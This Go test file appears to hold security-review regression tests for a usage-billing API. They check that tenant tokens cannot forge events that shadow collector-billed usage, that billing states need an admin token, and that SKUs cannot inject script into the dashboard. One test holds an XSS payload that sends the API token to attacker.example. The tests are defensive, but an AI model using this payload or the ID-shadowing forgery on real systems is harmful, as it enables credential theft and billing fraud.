package api

// Second independent review (v0.3.0). Every TestReview2* test here fails on
// v0.3.0 and describes the expected behavior.

import (
	"encoding/json"
	"fmt"
	"html"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/vclusterlabs-experiments/vbilling/internal/config"
	"github.com/vclusterlabs-experiments/vbilling/internal/discovery"
	"github.com/vclusterlabs-experiments/vbilling/internal/health"
	"github.com/vclusterlabs-experiments/vbilling/internal/pipeline"
	"github.com/vclusterlabs-experiments/vbilling/internal/records"
	"github.com/vclusterlabs-experiments/vbilling/internal/spool"
	"github.com/vclusterlabs-experiments/vbilling/internal/telemetry"
	"github.com/vclusterlabs-experiments/vbilling/internal/usage"
)

// firstWins replays the ledger the way billing platforms see it: event IDs
// are idempotency keys (Stripe identifier, Metronome and Lago
// transaction_id, the Stripe adapter's sent cache), so the first event with
// an ID is billed and later ones are dropped as duplicates.
func firstWins(t *testing.T, sp *spool.Spool) (billed map[string]usage.Event, shadowed map[string][]usage.Event) {
	t.Helper()
	recs, err := sp.Read(0, 1_000_000)
	if err != nil {
		t.Fatal(err)
	}
	billed, shadowed = map[string]usage.Event{}, map[string][]usage.Event{}
	for _, r := range recs {
		if r.Event == nil {
			continue
		}
		if _, dup := billed[r.Event.ID]; dup {
			shadowed[r.Event.ID] = append(shadowed[r.Event.ID], *r.Event)
			continue
		}
		billed[r.Event.ID] = *r.Event
	}
	return billed, shadowed
}

// Prior finding 6 scoped caller-supplied IDs of tenant-bound tokens
// (TenantEventID) and asked to "apply the same protection against
// collector IDs". An event sent WITHOUT an id still gets usage.DeriveID,
// which covers tenant, metric, window, region, project, SKU, resource and
// dimensions but not the source. A tenant that holds its own bound ingest
// token (docs: "a gateway inside a tenant's cluster") can therefore send,
// before the window closes, an id-less event with the identity of the
// collector's event for its own GPU-hours and a near-zero quantity. Both
// land in the ledger under one ID (AppendWindow does not deduplicate), and
// the billing platform keeps the first one: the tenant's.
//
// Since v0.3.3 a metric vBilling measures itself takes no pushed usage, so
// the tenant's event is refused outright. The operator may still correct
// such a metric, and its adjustment never takes the collector's ID either.
func TestReview2BoundTokenCannotPreemptCollectorEventIDs(t *testing.T) {
	e := setup(t, func(cfg *config.Config) {
		cfg.IngestToken = ""
		cfg.IngestTokens = map[string]string{"tok-acme": "acme"}
	})
	// acme's cluster runs, so usage may name it before its window is metered.
	e.server.ctrl = &pushCtrl{ready: true, clusters: []discovery.TenantCluster{
		{Namespace: "a", Name: "train", Annotations: map[string]string{discovery.AnnotationPrefix + "tenant": "acme"}}}}
	ws := now.Add(-2 * time.Minute)
	// What the collector will commit for the window (see env.commit). The
	// collector stamps its events with Source "collector" (not part of the ID).
	real := usage.Event{Tenant: "acme", Metric: usage.MetricGPUHours, Quantity: 8.0 / 60, SKU: "NVIDIA-H100", Region: "ap-southeast-2",
		WindowStart: ws, WindowEnd: ws.Add(time.Minute), Dimensions: map[string]string{usage.DimTenantCluster: "vcluster-a-train"}, RecordedAt: now,
		Source: spool.SourceCollector}
	real.Finalize()

	// The tenant, with its own bound token, while the window is still open.
	body := fmt.Sprintf(`[{"metric":%q,"quantity":0.000001,"sku":"NVIDIA-H100","window_start":%q,"window_end":%q,"dimensions":{%q:"vcluster-a-train"}}]`,
		usage.MetricGPUHours, ws.Format(time.RFC3339), ws.Add(time.Minute).Format(time.RFC3339), usage.DimTenantCluster)
	code, out := postJSON(t, e.srv.URL+"/api/v1/events", "tok-acme", body)
	if code != http.StatusBadRequest || out["accepted"] != float64(0) || !strings.Contains(fmt.Sprint(out["rejected"]), "measured by vBilling itself") {
		t.Fatalf("a tenant-bound token pushed under %s: %d %v, want it refused as a metric vBilling measures itself", usage.MetricGPUHours, code, out)
	}
	// The operator's own adjustment with the same identity, before the
	// window closes: it is stored, under an ID of its own.
	code, out = postJSON(t, e.srv.URL+"/api/v1/events?operator_adjustment=true", adminToken, strings.Replace(body, `[{`, `[{"tenant":"acme",`, 1))
	if code != http.StatusOK || out["accepted"] != float64(1) {
		t.Fatalf("operator adjustment: %d %v", code, out)
	}
	// The collector commits the window.
	if err := e.sp.AppendWindow(spool.SourceCollector, ws.Add(time.Minute), []usage.Event{real}, ""); err != nil {
		t.Fatal(err)
	}
	billed, shadowed := firstWins(t, e.sp)
	if got := billed[real.ID]; got.Source != spool.SourceCollector || len(shadowed[real.ID]) > 0 {
		t.Fatalf("an ingested event took the collector's event ID %s: billed %v GPU-hours from %q, the collector's %v GPU-hours is dropped as a duplicate (%d shadowed)",
			real.ID, got.Quantity, got.Source, usage.Round(8.0/60), len(shadowed[real.ID]))
	}
	if len(billed) != 2 {
		t.Fatalf("%d events billed, want the collector's and the operator's adjustment", len(billed))
	}
}

// The same collision with per-request records: the aggregator commits one
// event per tenant, metric, SKU and window with usage.DeriveID, so a bound
// token can shadow a whole window of tokens served by the operator's gateway.
//
// Since v0.3.3 a metric built from records takes records only, so the
// tenant's events are refused outright; the operator's adjustment under
// such a metric never takes the aggregator's ID either.
func TestReview2BoundTokenCannotPreemptAggregatedRecords(t *testing.T) {
	dir := t.TempDir()
	clock := func() time.Time { return now }
	sp, err := spool.Open(filepath.Join(dir, "ledger"), spool.Options{NoSync: true, Now: clock})
	if err != nil {
		t.Fatal(err)
	}
	rs, err := spool.Open(filepath.Join(dir, "records"), spool.Options{NoSync: true, Now: clock})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { sp.Close(); rs.Close() })
	formats, _ := records.LoadFormats("", true)
	if err := formats.Declare(); err != nil {
		t.Fatal(err)
	}
	h := health.New(nil)
	h.SetLogger(func(string, ...any) {})
	reg := pipeline.NewTenantRegistry()
	reg.Upsert(usage.Tenant{ID: "acme"})
	resolve := func(v string) (string, bool) {
		if v == "team-acme" {
			return "acme", true
		}
		_, ok := reg.Get(v)
		return v, ok
	}
	cfg := &config.Config{Region: "eu-west-1", CollectionInterval: time.Minute, APIToken: adminToken, IngestToken: "gateway-secret",
		IngestTokens: map[string]string{"tok-acme": "acme"}}
	ropts := records.Options{Window: time.Minute, Region: cfg.Region, Now: clock}
	in := records.NewIngester(rs, formats, ropts, resolve, h, nil)
	later := ropts
	later.Now = func() time.Time { return now.Add(time.Minute) } // the aggregator runs once the window settled
	agg := records.NewAggregator(rs, sp, later, h, nil)
	s := New(cfg, sp, nil, reg, nil, nil, telemetry.New(), "test").WithHealth(h).WithRecords(in)
	s.now = clock
	srv := httptest.NewServer(s.Handler())
	t.Cleanup(srv.Close)

	// The operator's LiteLLM pushes a request of tenant acme (team-acme),
	// on time for the window [11:59, 12:00).
	at := now.Add(-20 * time.Second)
	litellm := fmt.Sprintf(`[{"id":"c-1","status":"success","model_group":"llama-70b","prompt_tokens":120000,"completion_tokens":64000,"endTime":%v,
	  "metadata":{"user_api_key_team_id":"team-acme"}}]`, float64(at.Unix()))
	if code, out := postJSON(t, srv.URL+"/api/v1/records?format=litellm", "gateway-secret", litellm); code != 200 {
		t.Fatalf("gateway push: %d %v", code, out)
	}
	// The tenant knows the model it calls: it sends id-less events with the
	// identity of each usage row, one token each, before the window closes.
	var forged []map[string]any
	_ = rs.Scan(now.Add(-time.Hour), now.Add(time.Hour), func(ev *usage.Event) error {
		forged = append(forged, map[string]any{"tenant": "acme", "metric": ev.Metric, "quantity": 1, "sku": ev.SKU, "project": ev.Project,
			"resource_id": ev.ResourceID, "dimensions": ev.Dimensions, "window_start": ev.WindowStart, "window_end": ev.WindowEnd})
		return nil
	})
	if len(forged) == 0 {
		t.Fatal("no record rows")
	}
	b, _ := json.Marshal(forged)
	for _, ev := range forged {
		if def, _ := usage.Lookup(ev["metric"].(string)); def.Source != usage.SourceRecords {
			t.Fatalf("test setup: %s is declared with source %q, not by the litellm format: another test declared it as a custom metric first", def.Code, def.Source)
		}
	}
	if code, out := postJSON(t, srv.URL+"/api/v1/events", "tok-acme", string(b)); code != http.StatusBadRequest || out["accepted"] != float64(0) ||
		!strings.Contains(fmt.Sprint(out["rejected"]), "built from per-request records") {
		t.Fatalf("a tenant-bound token pushed window totals under the metrics of records: %d %v, want them refused", code, out)
	}
	// The operator's own adjustment with the same identities is stored, under
	// IDs of its own.
	if code, out := postJSON(t, srv.URL+"/api/v1/events?operator_adjustment=true", adminToken, string(b)); code != http.StatusOK || out["accepted"] != float64(len(forged)) {
		t.Fatalf("operator adjustment: %d %v", code, out)
	}
	if err := agg.Tick(); err != nil {
		t.Fatal(err)
	}
	billed, shadowed := firstWins(t, sp)
	committed := false
	for _, ev := range billed {
		committed = committed || ev.Source == records.SourceBase
	}
	for _, list := range shadowed {
		for _, ev := range list {
			committed = committed || ev.Source == records.SourceBase
		}
	}
	if !committed {
		t.Fatal("the aggregator committed no on-time event (test setup)")
	}
	for id, dropped := range shadowed {
		for _, d := range dropped {
			if d.Source == records.SourceBase {
				t.Fatalf("the aggregated %s of the operator's gateway (%v %s, ID %s) is shadowed by the tenant's own event (%v, source %q): the tenant is billed %v",
					d.Metric, d.Quantity, d.Unit, id, billed[id].Quantity, billed[id].Source, billed[id].Quantity)
			}
		}
	}
}

// INGEST_TOKENS are meant to be handed to gateways inside tenants' clusters,
// so those workloads reach the API. API_TOKEN is optional, and nothing
// requires it once tenant tokens or enforce mode are configured: then any
// workload that can send ingest requests can also set another tenant's
// billing state (pause drains and stops its clusters) and export every
// tenant's usage, without any token.
func TestReview2TenantFacingTokensRequireAnAdminToken(t *testing.T) {
	e := setup(t, func(cfg *config.Config) {
		cfg.IngestToken = ""
		cfg.IngestTokens = map[string]string{"tok-globex": "globex"}
		cfg.EnforcementMode = "enforce"
	})
	req, _ := http.NewRequest(http.MethodPut, e.srv.URL+"/api/v1/billing-states/acme", strings.NewReader(`{"state":"paused","reason":"x"}`))
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode == http.StatusOK || e.enf.StateOf("acme").State == "paused" {
		t.Fatalf("an unauthenticated PUT paused tenant acme (HTTP %d) on a server that hands out tenant ingest tokens in enforce mode", resp.StatusCode)
	}
}

// The dashboard puts esc("<b>" + sku + "</b>...") into a data-tip attribute,
// then reads it back with el.dataset.tip (which decodes the entities) and
// assigns it to tip.innerHTML: the SKU is rendered as HTML. SKUs are not
// validated, and since v0.3.0 a tenant-bound token lets a tenant choose
// one. Hovering (or tabbing to) the GPU-hours bar runs the tenant's script
// in the operator's dashboard, where the API token is in a global variable.
func TestReview2TenantSKUIsRenderedAsHTMLInTheDashboard(t *testing.T) {
	e := setup(t, func(cfg *config.Config) {
		cfg.IngestToken = ""
		cfg.IngestTokens = map[string]string{"tok-acme": "acme"}
	})
	payload := `<img src=x onerror="fetch('//attacker.example/'+token)">`
	ws := now.Add(-2 * time.Minute)
	ev, _ := json.Marshal([]map[string]any{{"id": "x1", "metric": pushedMetric, "quantity": 0.001, "sku": payload,
		"window_start": ws, "window_end": ws.Add(time.Minute)}})
	code, out := postJSON(t, e.srv.URL+"/api/v1/events", "tok-acme", string(ev))
	switch {
	case code == http.StatusBadRequest && strings.Contains(fmt.Sprint(out["rejected"]), "sku"):
		// v0.3.1 refuses the SKU at ingest. A ledger written before can still
		// hold one, and the dashboard must stay safe with it.
		stored := usage.Event{ID: "x1", Tenant: "acme", Metric: usage.MetricGPUHours, Quantity: 0.001, SKU: payload,
			WindowStart: ws, WindowEnd: ws.Add(time.Minute), RecordedAt: now, Source: "ingest:api"}
		stored.Finalize()
		if _, _, err := e.sp.AppendIngest(stored.Source, []usage.Event{stored}); err != nil {
			t.Fatal(err)
		}
	case code != http.StatusOK:
		t.Fatalf("ingest: %d %v", code, out)
	}
	// What the dashboard requests for its SKU chart.
	code, body := e.get(t, "/api/v1/usage?group_by=sku&metric="+usage.MetricGPUHours)
	if code != 200 {
		t.Fatal(code, body)
	}
	var resp struct {
		Rows []struct {
			SKU      string  `json:"sku"`
			Quantity float64 `json:"quantity"`
		} `json:"rows"`
	}
	_ = json.Unmarshal([]byte(body), &resp)
	src, err := os.ReadFile(filepath.Join("dashboard", "index.html"))
	if err != nil {
		t.Fatal(err)
	}
	sink := regexp.MustCompile(`data-tip="' \+ esc\("<b>" \+ label`).Match(src) && strings.Contains(string(src), "tip.innerHTML = html")
	if len(resp.Rows) == 0 {
		t.Fatal("test setup: the SKU chart has no rows")
	}
	if html := regexp.MustCompile(`innerHTML|outerHTML|insertAdjacentHTML|document\.write`).Find(src); html != nil {
		t.Fatalf("the dashboard still has an HTML sink (%s): data could be rendered as markup", html)
	}
	for _, r := range resp.Rows {
		// esc() into the attribute, entity-decoded by dataset, then innerHTML.
		tooltip := html.UnescapeString(dashboardEsc("<b>" + r.SKU + "</b><br>"))
		if sink && strings.Contains(tooltip, "<img src=x onerror=") {
			t.Fatalf("a tenant-chosen SKU reaches the dashboard tooltip as markup: tip.innerHTML = %q", tooltip)
		}
	}
}

// dashboardEsc is the dashboard's esc().
func dashboardEsc(s string) string {
	return strings.NewReplacer("&", "&amp;", "<", "&lt;", ">", "&gt;", `"`, "&quot;", "'", "&#39;").Replace(s)
}
